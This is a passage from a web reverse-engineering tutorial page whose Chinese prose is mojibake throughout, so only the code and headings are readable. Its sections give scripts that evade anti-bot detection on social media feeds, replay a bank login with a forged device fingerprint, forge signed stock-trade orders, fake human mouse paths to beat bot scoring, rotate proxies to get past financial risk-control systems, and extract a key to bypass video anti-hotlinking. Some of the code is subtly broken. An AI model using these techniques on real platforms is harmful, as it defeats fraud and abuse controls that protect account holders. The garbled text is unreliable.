<li><p><strong>é¢‘ç‡é™åˆ¶</strong></p>
<ul>
<li>å• IP æ¯åˆ†é’Ÿè¯·æ±‚é™åˆ¶</li>
<li>è´¦å·æ¯æ—¥çˆ¬å–ä¸Šé™</li>
</ul>
</li>
<li><p><strong>è¡Œä¸ºåˆ†æ</strong></p>
<ul>
<li>é¼ æ ‡ç§»åŠ¨è½¨è¿¹</li>
<li>æ»šåŠ¨è¡Œä¸º</li>
<li>åœç•™æ—¶é—´åˆ†å¸ƒ</li>
</ul>
</li>
<li><p><strong>è®¾å¤‡æŒ‡çº¹</strong></p>
<ul>
<li>Canvas æŒ‡çº¹</li>
<li>WebGL æŒ‡çº¹</li>
<li>å­—ä½“æŒ‡çº¹</li>
</ul>
</li>
<li><p><strong>éªŒè¯ç </strong></p>
<ul>
<li>æ»‘å—éªŒè¯</li>
<li>å›¾ç‰‡è¯†åˆ«</li>
<li>è¡Œä¸ºéªŒè¯</li>
</ul>
</li>
</ol>
<h3>ç»•è¿‡ç­–ç•¥</h3>
<pre><code class="language-python">import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
import time
import random

class StealthScraper:
    def __init__(self):
        # ä½¿ç”¨ undetected-chromedriver ç»•è¿‡æ£€æµ‹
        options = uc.ChromeOptions()
        options.add_argument('--disable-blink-features=AutomationControlled')

        self.driver = uc.Chrome(options=options)

    def human_like_scroll(self):
        &quot;&quot;&quot;æ¨¡æ‹ŸçœŸäººæ»šåŠ¨&quot;&quot;&quot;
        # éšæœºæ»šåŠ¨è·ç¦»
        scroll_distance = random.randint(300, 700)

        # åˆ†å¤šæ¬¡æ»šåŠ¨ï¼ˆæ¨¡æ‹ŸçœŸäººï¼‰
        for _ in range(random.randint(3, 6)):
            self.driver.execute_script(f&quot;window.scrollBy(0, {random.randint(50, 150)})&quot;)
            time.sleep(random.uniform(0.1, 0.3))

        # åœé¡¿
        time.sleep(random.uniform(1, 3))

    def scrape_feed(self):
        &quot;&quot;&quot;çˆ¬å–ä¿¡æ¯æµ&quot;&quot;&quot;
        self.driver.get('https://example.com/feed')
        time.sleep(3)

        posts = []
        for page in range(5):
            # æ¨¡æ‹ŸçœŸäººæ»šåŠ¨
            self.human_like_scroll()

            # æå–å¸–å­
            post_elements = self.driver.find_elements(By.CLASS_NAME, 'post')
            for elem in post_elements:
                posts.append({
                    'id': elem.get_attribute('data-post-id'),
                    'text': elem.find_element(By.CLASS_NAME, 'text').text
                })

            # éšæœºåœé¡¿
            time.sleep(random.uniform(2, 5))

        return posts

# ä½¿ç”¨
scraper = StealthScraper()
posts = scraper.scrape_feed()
</code></pre>
<hr />
<h2>æ€»ç»“</h2>
<p>ç¤¾äº¤åª’ä½“é€†å‘çš„å…³é”®æŠ€æœ¯ï¼š</p>
<ol>
<li><p><strong>åˆ†é¡µæœºåˆ¶ç†è§£</strong></p>
<ul>
<li>æ¸¸æ ‡åˆ†é¡µ</li>
<li>æ—¶é—´æˆ³åˆ†é¡µ</li>
<li>ID åˆ†é¡µ</li>
</ul>
</li>
<li><p><strong>API é€†å‘</strong></p>
<ul>
<li>REST API</li>
<li>GraphQL</li>
<li>WebSocket</li>
</ul>
</li>
<li><p><strong>ç­¾åä¸åŠ å¯†</strong></p>
<ul>
<li>URL ç­¾å</li>
<li>å‚æ•°åŠ å¯†</li>
<li>Token ç”Ÿæˆ</li>
</ul>
</li>
<li><p><strong>è¡Œä¸ºæ¨¡æ‹Ÿ</strong></p>
<ul>
<li>é¼ æ ‡è½¨è¿¹</li>
<li>æ»šåŠ¨è¡Œä¸º</li>
<li>éšæœºå»¶è¿Ÿ</li>
</ul>
</li>
<li><p><strong>åæ£€æµ‹</strong></p>
<ul>
<li>è®¾å¤‡æŒ‡çº¹ä¼ªé€ </li>
<li>ä»£ç†è½®æ¢</li>
<li>æ— å¤´æµè§ˆå™¨æ£€æµ‹ç»•è¿‡</li>
</ul>
</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li>GraphQL API åˆ†æ</li>
<li>WebSocket é€šä¿¡åˆ†æ</li>
<li>æ— é™æ»šåŠ¨åŠ è½½</li>
<li>è®¾å¤‡æŒ‡çº¹è¯†åˆ«</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-47">
                                                <h2>[R46] Financial Websites</h2>
                                                <h1>R46: é‡‘èç½‘ç«™é€†å‘æ¡ˆä¾‹</h1>
<h2>æ¦‚è¿°</h2>
<p>é‡‘èç½‘ç«™é€šå¸¸å…·æœ‰æé«˜çš„å®‰å…¨è¦æ±‚ï¼ŒåŒ…æ‹¬å¤šå±‚åŠ å¯†ã€åŠ¨æ€ä»¤ç‰Œã€è®¾å¤‡æŒ‡çº¹ã€è¡Œä¸ºåˆ†æç­‰ã€‚æœ¬æ–‡é€šè¿‡çœŸå®æ¡ˆä¾‹ä»‹ç»é‡‘èç½‘ç«™çš„é€†å‘åˆ†ææ–¹æ³•å’Œå®‰å…¨æœºåˆ¶ã€‚</p>
<hr />
<h2>æ¡ˆä¾‹ä¸€ï¼šè‚¡ç¥¨è¡Œæƒ…æ•°æ®åŠ å¯†</h2>
<h3>èƒŒæ™¯</h3>
<p>æŸè‚¡ç¥¨äº¤æ˜“å¹³å°çš„å®æ—¶è¡Œæƒ…æ¥å£è¿”å›åŠ å¯†æ•°æ®ï¼š</p>
<pre><code class="language-json">{
  &quot;code&quot;: &quot;600000&quot;,
  &quot;data&quot;: &quot;eJyNVE1v2zAM/SuBzs4h...&quot;,
  &quot;timestamp&quot;: 1702800000
}
</code></pre>
<p>å‰ç«¯èƒ½å®æ—¶æ˜¾ç¤ºè‚¡ä»·ã€æ¶¨è·Œå¹…ç­‰ä¿¡æ¯ï¼Œè¯´æ˜å­˜åœ¨è§£å¯†é€»è¾‘ã€‚</p>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æ</h4>
<p>ä½¿ç”¨ Chrome DevTools è§‚å¯Ÿ WebSocket é€šä¿¡ï¼š</p>
<pre><code class="language-javascript">// æ‰“å¼€æ§åˆ¶å°
const ws = new WebSocket(&quot;wss://stock.example.com/realtime&quot;);

ws.onmessage = function (event) {
  console.log(&quot;Raw data:&quot;, event.data);
  // {&quot;code&quot;:&quot;600000&quot;,&quot;data&quot;:&quot;eJyNVE1v2zAM...&quot;,&quot;timestamp&quot;:1702800000}
};
</code></pre>
<h4>2. å®šä½è§£å¯†å‡½æ•°</h4>
<p><strong>æ–¹æ³•ï¼šæœç´¢å…³é”®è¯</strong></p>
<p>åœ¨ Sources é¢æ¿å…¨å±€æœç´¢ï¼š</p>
<ul>
<li><code>&quot;data&quot;</code> å­—æ®µè®¿é—®</li>
<li><code>decompress</code></li>
<li><code>inflate</code></li>
<li><code>pako</code> (å¸¸è§å‹ç¼©åº“)</li>
</ul>
<p>æ‰¾åˆ°è§£å¯†ä»£ç ï¼š</p>
<pre><code class="language-javascript">function decodeMarketData(encryptedData) {
  // 1. Base64 è§£ç 
  const compressed = atob(encryptedData);

  // 2. ä½¿ç”¨ pako è§£å‹ç¼© (GZIP)
  const binaryData = pako.inflate(compressed, { to: &quot;string&quot; });

  // 3. JSON è§£æ
  return JSON.parse(binaryData);
}
</code></pre>
<h4>3. Python å®ç°</h4>
<pre><code class="language-python">import base64
import gzip
import json

def decode_market_data(encrypted_data):
    # Base64 è§£ç 
    compressed = base64.b64decode(encrypted_data)

    # GZIP è§£å‹
    decompressed = gzip.decompress(compressed)

    # JSON è§£æ
    return json.loads(decompressed.decode('utf-8'))

# æµ‹è¯•
encrypted = &quot;eJyNVE1v2zAM/SuBzs4h...&quot;
data = decode_market_data(encrypted)
print(data)
# {
#     &quot;price&quot;: 13.56,
#     &quot;change&quot;: 0.23,
#     &quot;volume&quot;: 1234567,
#     ...
# }
</code></pre>
<hr />
<h2>æ¡ˆä¾‹äºŒï¼šç™»å½•åŠ å¯†ä¸åŒå› ç´ è®¤è¯</h2>
<h3>èƒŒæ™¯</h3>
<p>æŸç½‘é“¶ç™»å½•æµç¨‹ï¼š</p>
<ol>
<li>è¾“å…¥ç”¨æˆ·åå¯†ç </li>
<li>å¯†ç éœ€è¦åŠ å¯†ä¼ è¾“</li>
<li>éœ€è¦çŸ­ä¿¡éªŒè¯ç ï¼ˆåŒå› ç´ è®¤è¯ï¼‰</li>
<li>ç™»å½•æˆåŠŸåè·å– Token</li>
</ol>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æç™»å½•è¯·æ±‚</h4>
<pre><code class="language-http">POST /api/login HTTP/1.1
Content-Type: application/json

{
    &quot;username&quot;: &quot;user123&quot;,
    &quot;password_enc&quot;: &quot;MIGfMA0GCSqGSIb3DQEBA...&quot;,
    &quot;device_id&quot;: &quot;uuid-1234-5678&quot;,
    &quot;timestamp&quot;: 1702800000,
    &quot;sign&quot;: &quot;e10adc3949ba59abbe56e057f20f883e&quot;
}
</code></pre>
<h4>2. åˆ†æå¯†ç åŠ å¯†</h4>
<p>åœ¨ç™»å½•æŒ‰é’®ç‚¹å‡»äº‹ä»¶ä¸Šè®¾ç½®æ–­ç‚¹ï¼š</p>
<pre><code class="language-javascript">// æ‰¾åˆ°åŠ å¯†å‡½æ•°
function encryptPassword(password, publicKey) {
  // ä½¿ç”¨ RSA å…¬é’¥åŠ å¯†
  const encrypt = new JSEncrypt();
  encrypt.setPublicKey(publicKey);
  return encrypt.encrypt(password);
}

// å…¬é’¥ä»æœåŠ¡å™¨è·å–
fetch(&quot;/api/public-key&quot;)
  .then((res) =&gt; res.json())
  .then((data) =&gt; {
    const publicKey = data.public_key;
    const encryptedPwd = encryptPassword(password, publicKey);
    // å‘é€ç™»å½•è¯·æ±‚
  });
</code></pre>
<p><strong>å…¬é’¥ç¤ºä¾‹</strong>:</p>
<pre><code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...
-----END PUBLIC KEY-----
</code></pre>
<h4>3. è®¾å¤‡æŒ‡çº¹ç”Ÿæˆ</h4>
<pre><code class="language-javascript">function generateDeviceId() {
  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    timezone: new Date().getTimezoneOffset(),
    plugins: Array.from(navigator.plugins)
      .map((p) =&gt; p.name)
      .join(&quot;,&quot;),
    canvas: getCanvasFingerprint(),
  };

  // ç”Ÿæˆå”¯ä¸€ ID
  const str = JSON.stringify(fingerprint);
  return md5(str);
}

function getCanvasFingerprint() {
  const canvas = document.createElement(&quot;canvas&quot;);
  const ctx = canvas.getContext(&quot;2d&quot;);
  ctx.textBaseline = &quot;top&quot;;
  ctx.font = &quot;14px Arial&quot;;
  ctx.fillText(&quot;Device Fingerprint&quot;, 2, 2);
  return canvas.toDataURL();
}
</code></pre>
<h4>4. Python å®Œæ•´å®ç°</h4>
<pre><code class="language-python">import requests
import hashlib
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

class BankLogin:
    def __init__(self):
        self.session = requests.Session()
        self.public_key = None

    def get_public_key(self):
        &quot;&quot;&quot;è·å– RSA å…¬é’¥&quot;&quot;&quot;
        response = self.session.get('https://bank.example.com/api/public-key')
        self.public_key = response.json()['public_key']
        return self.public_key

    def encrypt_password(self, password):
        &quot;&quot;&quot;RSA åŠ å¯†å¯†ç &quot;&quot;&quot;
        key = RSA.import_key(self.public_key)
        cipher = PKCS1_v1_5.new(key)
        encrypted = cipher.encrypt(password.encode())
        return base64.b64encode(encrypted).decode()

    def generate_device_id(self):
        &quot;&quot;&quot;ç”Ÿæˆè®¾å¤‡æŒ‡çº¹&quot;&quot;&quot;
        fingerprint = {
            'userAgent': 'Mozilla/5.0...',
            'language': 'zh-CN',
            'platform': 'Linux x86_64',
            'screen': '1920x1080',
            'timezone': -480
        }
        fp_str = str(fingerprint)
        return hashlib.md5(fp_str.encode()).hexdigest()

    def generate_sign(self, params):
        &quot;&quot;&quot;ç”Ÿæˆç­¾å&quot;&quot;&quot;
        sorted_params = sorted(params.items())
        sign_str = '&amp;'.join([f&quot;{k}={v}&quot; for k, v in sorted_params])
        sign_str += '&amp;key=SECRET_KEY_2023'
        return hashlib.md5(sign_str.encode()).hexdigest()

    def login(self, username, password):
        &quot;&quot;&quot;ç™»å½•æµç¨‹&quot;&quot;&quot;
        # 1. è·å–å…¬é’¥
        self.get_public_key()

        # 2. åŠ å¯†å¯†ç 
        password_enc = self.encrypt_password(password)

        # 3. å‡†å¤‡å‚æ•°
        timestamp = int(time.time())
        params = {
            'username': username,
            'password_enc': password_enc,
            'device_id': self.generate_device_id(),
            'timestamp': timestamp
        }

        # 4. ç”Ÿæˆç­¾å
        params['sign'] = self.generate_sign(params)

        # 5. å‘é€ç™»å½•è¯·æ±‚
        response = self.session.post(
            'https://bank.example.com/api/login',
            json=params
        )

        return response.json()

    def verify_sms(self, code):
        &quot;&quot;&quot;éªŒè¯çŸ­ä¿¡éªŒè¯ç &quot;&quot;&quot;
        response = self.session.post(
            'https://bank.example.com/api/verify-sms',
            json={'code': code}
        )
        return response.json()

# ä½¿ç”¨
bank = BankLogin()
result = bank.login('user123', 'password123')
print(result)

# è¾“å…¥çŸ­ä¿¡éªŒè¯ç 
sms_code = input('è¯·è¾“å…¥çŸ­ä¿¡éªŒè¯ç : ')
verify_result = bank.verify_sms(sms_code)
print('Token:', verify_result['token'])
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ä¸‰ï¼šäº¤æ˜“è®¢å•ç­¾åé˜²ç¯¡æ”¹</h2>
<h3>èƒŒæ™¯</h3>
<p>è‚¡ç¥¨äº¤æ˜“ä¸‹å•æ¥å£éœ€è¦å¯¹è®¢å•å‚æ•°è¿›è¡Œç­¾åï¼Œé˜²æ­¢å‚æ•°è¢«ç¯¡æ”¹ï¼š</p>
<pre><code class="language-http">POST /api/trade/order HTTP/1.1

{
    &quot;stock_code&quot;: &quot;600000&quot;,
    &quot;action&quot;: &quot;buy&quot;,
    &quot;price&quot;: 13.56,
    &quot;quantity&quot;: 1000,
    &quot;timestamp&quot;: 1702800000,
    &quot;nonce&quot;: &quot;abc123&quot;,
    &quot;signature&quot;: &quot;1a2b3c4d...&quot;
}
</code></pre>
<hr />
<h3>é€†å‘åˆ†æ</h3>
<h4>1. å®šä½ç­¾åç”Ÿæˆå‡½æ•°</h4>
<p>åœ¨ä¸‹å•æŒ‰é’®ä¸Šè®¾ç½®æ–­ç‚¹ï¼Œè¿½è¸ªè°ƒç”¨æ ˆï¼š</p>
<pre><code class="language-javascript">function generateOrderSignature(orderData) {
  // 1. å‚æ•°æ’åº
  const keys = Object.keys(orderData).sort();

  // 2. æ‹¼æ¥å­—ç¬¦ä¸²
  let signStr = &quot;&quot;;
  keys.forEach((key) =&gt; {
    if (key !== &quot;signature&quot;) {
      signStr += `${key}=${orderData[key]}&amp;`;
    }
  });

  // 3. æ·»åŠ ç§é’¥ï¼ˆä» localStorage è·å–ï¼‰
  const privateKey = localStorage.getItem(&quot;user_private_key&quot;);
  signStr += `key=${privateKey}`;

  // 4. SHA256 ç­¾å
  return CryptoJS.SHA256(signStr).toString();
}
</code></pre>
<h4>2. ç§é’¥è·å–</h4>
<p>ç§é’¥åœ¨ç™»å½•æˆåŠŸåå­˜å‚¨ï¼š</p>
<pre><code class="language-javascript">// ç™»å½•å“åº”
{
    &quot;token&quot;: &quot;eyJhbGciOiJIUzI1NiIs...&quot;,
    &quot;private_key&quot;: &quot;sk_live_1234567890abcdef&quot;  // ç”¨æˆ·ç§é’¥
}

// å­˜å‚¨åˆ° localStorage
localStorage.setItem('user_private_key', data.private_key);
</code></pre>
<h4>3. Python å®ç°</h4>
<pre><code class="language-python">import hashlib
import time
import uuid

def generate_order_signature(order_data, private_key):
    # ç§»é™¤ signature å­—æ®µ
    params = {k: v for k, v in order_data.items() if k != 'signature'}

    # å‚æ•°æ’åº
    sorted_params = sorted(params.items())

    # æ‹¼æ¥å­—ç¬¦ä¸²
    sign_str = '&amp;'.join([f&quot;{k}={v}&quot; for k, v in sorted_params])
    sign_str += f'&amp;key={private_key}'

    # SHA256
    return hashlib.sha256(sign_str.encode()).hexdigest()

# ä¸‹å•
order_data = {
    'stock_code': '600000',
    'action': 'buy',
    'price': 13.56,
    'quantity': 1000,
    'timestamp': int(time.time()),
    'nonce': str(uuid.uuid4())
}

# ç”Ÿæˆç­¾å
private_key = 'sk_live_1234567890abcdef'  # ä»ç™»å½•å“åº”è·å–
order_data['signature'] = generate_order_signature(order_data, private_key)

# å‘é€è®¢å•
response = requests.post(
    'https://stock.example.com/api/trade/order',
    json=order_data,
    headers={'Authorization': f'Bearer {token}'}
)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹å››ï¼šåè‡ªåŠ¨åŒ–äº¤æ˜“æ£€æµ‹</h2>
<h3>èƒŒæ™¯</h3>
<p>é‡‘èå¹³å°ä¼šæ£€æµ‹è‡ªåŠ¨åŒ–äº¤æ˜“è¡Œä¸ºï¼š</p>
<ul>
<li>é¼ æ ‡è½¨è¿¹åˆ†æ</li>
<li>æ“ä½œæ—¶é—´é—´éš”</li>
<li>é”®ç›˜è¾“å…¥æ¨¡å¼</li>
<li>WebGL æŒ‡çº¹</li>
<li>æµè§ˆå™¨ç‰¹å¾</li>
</ul>
<hr />
<h3>æ£€æµ‹æœºåˆ¶åˆ†æ</h3>
<h4>1. é¼ æ ‡è½¨è¿¹æ”¶é›†</h4>
<pre><code class="language-javascript">// å¹³å°æ”¶é›†é¼ æ ‡ç§»åŠ¨è½¨è¿¹
let mouseTrack = [];
document.addEventListener(&quot;mousemove&quot;, function (e) {
  mouseTrack.push({
    x: e.clientX,
    y: e.clientY,
    timestamp: Date.now(),
  });
});

// æäº¤è®¢å•æ—¶ä¸€èµ·å‘é€
function submitOrder(orderData) {
  const payload = {
    ...orderData,
    mouse_track: mouseTrack,
    behavior_score: calculateBehaviorScore(mouseTrack),
  };

  return fetch(&quot;/api/trade/order&quot;, {
    method: &quot;POST&quot;,
    body: JSON.stringify(payload),
  });
}

function calculateBehaviorScore(track) {
  // åˆ†æé¼ æ ‡è½¨è¿¹æ˜¯å¦è‡ªç„¶
  // çœŸäººï¼šæ›²çº¿ã€æœ‰æŠ–åŠ¨ã€é€Ÿåº¦å˜åŒ–
  // æœºå™¨ï¼šç›´çº¿ã€åŒ€é€Ÿ

  let smoothness = 0;
  for (let i = 1; i &lt; track.length; i++) {
    const dx = track[i].x - track[i - 1].x;
    const dy = track[i].y - track[i - 1].y;
    const distance = Math.sqrt(dx * dx + dy * dy);
    const time = track[i].timestamp - track[i - 1].timestamp;
    const speed = distance / time;

    // é€Ÿåº¦å˜åŒ–è¶Šå¤§ï¼Œè¶ŠåƒçœŸäºº
    smoothness += Math.abs(speed - (previousSpeed || speed));
    previousSpeed = speed;
  }

  return smoothness &gt; 100 ? 1 : 0; // 1=çœŸäººï¼Œ0=å¯ç–‘
}
</code></pre>
<h4>2. ç»•è¿‡ç­–ç•¥</h4>
<p><strong>ä½¿ç”¨ Selenium æ¨¡æ‹ŸçœŸå®è¡Œä¸º</strong>:</p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
import time
import random
import numpy as np

def generate_bezier_curve(start, end, control_points=2):
    &quot;&quot;&quot;ç”Ÿæˆè´å¡å°”æ›²çº¿è·¯å¾„ï¼ˆæ¨¡æ‹ŸçœŸå®é¼ æ ‡ç§»åŠ¨ï¼‰&quot;&quot;&quot;
    # éšæœºç”Ÿæˆæ§åˆ¶ç‚¹
    points = [start]
    for _ in range(control_points):
        points.append((
            random.randint(min(start[0], end[0]), max(start[0], end[0])),
            random.randint(min(start[1], end[1]), max(start[1], end[1]))
        ))
    points.append(end)

    # è´å¡å°”æ›²çº¿æ’å€¼
    path = []
    for t in np.linspace(0, 1, 50):
        x = sum([(1-t)**(len(points)-1-i) * t**i * p[0] * np.math.comb(len(points)-1, i)
                for i, p in enumerate(points)])
        y = sum([(1-t)**(len(points)-1-i) * t**i * p[1] * np.math.comb(len(points)-1, i)
                for i, p in enumerate(points)])
        path.append((int(x), int(y)))

    return path

def human_like_click(driver, element):
    &quot;&quot;&quot;æ¨¡æ‹ŸçœŸäººç‚¹å‡»&quot;&quot;&quot;
    # 1. ç§»åŠ¨åˆ°å…ƒç´ é™„è¿‘
    location = element.location
    size = element.size

    # éšæœºåç§»
    target_x = location['x'] + random.randint(5, size['width'] - 5)
    target_y = location['y'] + random.randint(5, size['height'] - 5)

    # ç”Ÿæˆæ›²çº¿è·¯å¾„
    current_pos = (random.randint(0, 800), random.randint(0, 600))
    path = generate_bezier_curve(current_pos, (target_x, target_y))

    # 2. æ²¿æ›²çº¿ç§»åŠ¨
    actions = ActionChains(driver)
    for x, y in path:
        actions.move_by_offset(x - current_pos[0], y - current_pos[1])
        actions.pause(random.uniform(0.001, 0.005))  # éšæœºå»¶è¿Ÿ
        current_pos = (x, y)

    # 3. ç‚¹å‡»å‰åœé¡¿
    actions.pause(random.uniform(0.1, 0.3))

    # 4. ç‚¹å‡»
    actions.click()
    actions.perform()

    # 5. ç‚¹å‡»ååœé¡¿
    time.sleep(random.uniform(0.5, 1.5))

# ä½¿ç”¨
driver = webdriver.Chrome()
driver.get('https://stock.example.com/trade')

buy_button = driver.find_element_by_id('buy-button')
human_like_click(driver, buy_button)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹äº”ï¼šå®æ—¶é£æ§ç³»ç»Ÿç»•è¿‡</h2>
<h3>èƒŒæ™¯</h3>
<p>å¹³å°æœ‰å®æ—¶é£æ§ç³»ç»Ÿï¼Œç›‘æ§å¼‚å¸¸è¡Œä¸ºï¼š</p>
<ul>
<li>åŒä¸€ IP çŸ­æ—¶é—´å¤šæ¬¡ç™»å½•</li>
<li>å¼‚å¸¸äº¤æ˜“æ¨¡å¼</li>
<li>è®¾å¤‡æŒ‡çº¹å˜åŒ–</li>
<li>åœ°ç†ä½ç½®è·³å˜</li>
</ul>
<hr />
<h3>ç»•è¿‡ç­–ç•¥</h3>
<h4>1. ä½¿ç”¨ä»£ç†æ± </h4>
<pre><code class="language-python">import requests
from itertools import cycle

class ProxyRotator:
    def __init__(self, proxy_list):
        self.proxy_pool = cycle(proxy_list)

    def get_session(self):
        proxy = next(self.proxy_pool)
        session = requests.Session()
        session.proxies = {
            'http': proxy,
            'https': proxy
        }
        return session

# ä½¿ç”¨
proxies = [
    'http://proxy1.com:8080',
    'http://proxy2.com:8080',
    'http://proxy3.com:8080'
]

rotator = ProxyRotator(proxies)

for i in range(10):
    session = rotator.get_session()
    response = session.get('https://stock.example.com/api/market-data')
    print(f'Request {i}: {response.status_code}')
    time.sleep(random.uniform(2, 5))  # éšæœºå»¶è¿Ÿ
</code></pre>
<h4>2. ä¿æŒè®¾å¤‡æŒ‡çº¹ä¸€è‡´æ€§</h4>
<pre><code class="language-python">class ConsistentBrowser:
    def __init__(self):
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...'
        self.headers = {
            'User-Agent': self.user_agent,
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
        }
        self.device_id = self.generate_device_id()

    def generate_device_id(self):
        # ç”Ÿæˆä¸€æ¬¡åä¿æŒä¸å˜
        fingerprint = {
            'userAgent': self.user_agent,
            'screen': '1920x1080',
            'timezone': -480
        }
        return hashlib.md5(str(fingerprint).encode()).hexdigest()

    def request(self, url):
        headers = self.headers.copy()
        headers['X-Device-Id'] = self.device_id

        return requests.get(url, headers=headers)
</code></pre>
<hr />
<h2>å®‰å…¨å»ºè®®</h2>
<h3>å¯¹äºé‡‘èå¹³å°</h3>
<ol>
<li><p><strong>å¤šå±‚åŠ å¯†</strong></p>
<ul>
<li>ä¼ è¾“å±‚: TLS 1.3</li>
<li>åº”ç”¨å±‚: RSA + AES</li>
<li>æ•°æ®åº“: å­—æ®µçº§åŠ å¯†</li>
</ul>
</li>
<li><p><strong>åŠ¨æ€é˜²æŠ¤</strong></p>
<ul>
<li>æ¯æ¬¡ç™»å½•æ›´æ–°å…¬é’¥</li>
<li>Token çŸ­æœŸæœ‰æ•ˆï¼ˆ15 åˆ†é’Ÿï¼‰</li>
<li>ç­¾åç›å€¼å®šæœŸè½®æ¢</li>
</ul>
</li>
<li><p><strong>è¡Œä¸ºåˆ†æ</strong></p>
<ul>
<li>æœºå™¨å­¦ä¹ æ£€æµ‹å¼‚å¸¸</li>
<li>å¤šç»´åº¦æŒ‡çº¹è¯†åˆ«</li>
<li>å®æ—¶é£æ§è§„åˆ™å¼•æ“</li>
</ul>
</li>
<li><p><strong>å®¡è®¡æ—¥å¿—</strong></p>
<ul>
<li>è®°å½•æ‰€æœ‰æ•æ„Ÿæ“ä½œ</li>
<li>å¼‚å¸¸å‘Šè­¦</li>
<li>å¯è¿½æº¯æ€§</li>
</ul>
</li>
</ol>
<h3>å¯¹äºç ”ç©¶äººå‘˜</h3>
<ol>
<li><p><strong>åˆæ³•åˆè§„</strong></p>
<ul>
<li>ä»…åœ¨æˆæƒèŒƒå›´å†…ç ”ç©¶</li>
<li>ä¸è¿›è¡Œå®é™…äº¤æ˜“æµ‹è¯•</li>
<li>è´Ÿè´£ä»»æŠ«éœ²æ¼æ´</li>
</ul>
</li>
<li><p><strong>æµ‹è¯•ç¯å¢ƒ</strong></p>
<ul>
<li>ä½¿ç”¨æ¼”ç¤ºè´¦æˆ·</li>
<li>æ²™ç®±ç¯å¢ƒ</li>
<li>ä¸æ¶‰åŠçœŸå®èµ„é‡‘</li>
</ul>
</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li>åŠ å¯†ç®—æ³•é€†å‘</li>
<li>è®¾å¤‡æŒ‡çº¹è¯†åˆ«</li>
<li>WebSocket é€šä¿¡åˆ†æ</li>
<li>è¡Œä¸ºæ£€æµ‹ç»•è¿‡</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-48">
                                                <h2>[R47] Video Streaming</h2>
                                                <h1>R47: è§†é¢‘ç½‘ç«™é€†å‘</h1>
<h2>æ¦‚è¿°</h2>
<p>è§†é¢‘ç½‘ç«™æ˜¯æœ€å…·æŒ‘æˆ˜æ€§çš„é€†å‘å·¥ç¨‹ç›®æ ‡ä¹‹ä¸€ã€‚æœ¬æ–‡é€šè¿‡ 5 ä¸ªçœŸå®æ¡ˆä¾‹ï¼Œæ·±å…¥è®²è§£è§†é¢‘å¹³å°çš„æ ¸å¿ƒé˜²æŠ¤æœºåˆ¶åŠå…¶é€†å‘æ–¹æ³•ã€‚</p>
<hr />
<h2>æ¡ˆä¾‹ 1: è§†é¢‘ URL è§£å¯†ä¸é˜²ç›—é“¾ç»•è¿‡</h2>
<h3>èƒŒæ™¯</h3>
<p>æŸè§†é¢‘å¹³å°ä½¿ç”¨åŠ å¯† URL å’Œæ—¶é—´æˆ³ç­¾åæ¥é˜²æ­¢è§†é¢‘ç›—é“¾ã€‚è§†é¢‘æ’­æ”¾æ—¶ï¼Œå®¢æˆ·ç«¯éœ€è¦åŠ¨æ€ç”Ÿæˆå¸¦ç­¾åçš„æ’­æ”¾åœ°å€ã€‚</p>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æ</h4>
<p><strong>ç½‘ç»œè¯·æ±‚</strong>:</p>
<pre><code>GET /video/play?vid=abc123&amp;t=1702800000&amp;sign=e3b0c44298fc
Host: video.example.com
Referer: https://video.example.com/watch/abc123
</code></pre>
<p><strong>å“åº”</strong>:</p>
<pre><code class="language-json">{
  &quot;code&quot;: 0,
  &quot;data&quot;: {
    &quot;url&quot;: &quot;https://cdn.example.com/stream/abc123.m3u8?token=xxx&amp;expires=1702803600&quot;
  }
}
</code></pre>
<h4>2. JavaScript åˆ†æ</h4>
<p>åœ¨ <code>player.js</code> ä¸­æ‰¾åˆ°ç­¾åç”Ÿæˆé€»è¾‘:</p>
<pre><code class="language-javascript">function generateSign(vid, timestamp) {
  const key = &quot;secret_key_2024&quot;;
  const str = `${vid}|${timestamp}|${key}`;
  return md5(str).substr(0, 12);
}

function getPlayUrl(vid) {
  const timestamp = Math.floor(Date.now() / 1000);
  const sign = generateSign(vid, timestamp);

  return fetch(`/video/play?vid=${vid}&amp;t=${timestamp}&amp;sign=${sign}`, {
    headers: {
      Referer: &quot;https://video.example.com/watch/&quot; + vid,
    },
  }).then((r) =&gt; r.json());
}
</code></pre>
<h4>3. å¯†é’¥æå–</h4>
<p>é€šè¿‡æœç´¢ <code>secret_key</code> å…³é”®è¯ï¼Œåœ¨æ··æ·†ä»£ç ä¸­å®šä½:</p>
<pre><code class="language-javascript">// æ··æ·†å
var _0x1a2b = [
  &quot;s&quot;,
  &quot;e&quot;,
  &quot;c&quot;,
  &quot;r&quot;,
  &quot;e&quot;,
  &quot;t&quot;,
  &quot;_&quot;,
  &quot;k&quot;,
  &quot;e&quot;,
  &quot;y&quot;,
  &quot;_&quot;,
  &quot;2&quot;,
  &quot;0&quot;,
  &quot;2&quot;,
  &quot;4&quot;,
];
var key = _0x1a2b.join(&quot;&quot;);
</code></pre>
<h3>Python å®ç°</h3>
<pre><code class="language-python">import hashlib
import time
import requests

class VideoDownloader:
    def __init__(self):
        self.base_url = &quot;https://video.example.com&quot;
        self.secret_key = &quot;secret_key_2024&quot;

    def generate_sign(self, vid, timestamp):
        &quot;&quot;&quot;ç”Ÿæˆè§†é¢‘ç­¾å&quot;&quot;&quot;
        str_to_sign = f&quot;{vid}|{timestamp}|{self.secret_key}&quot;
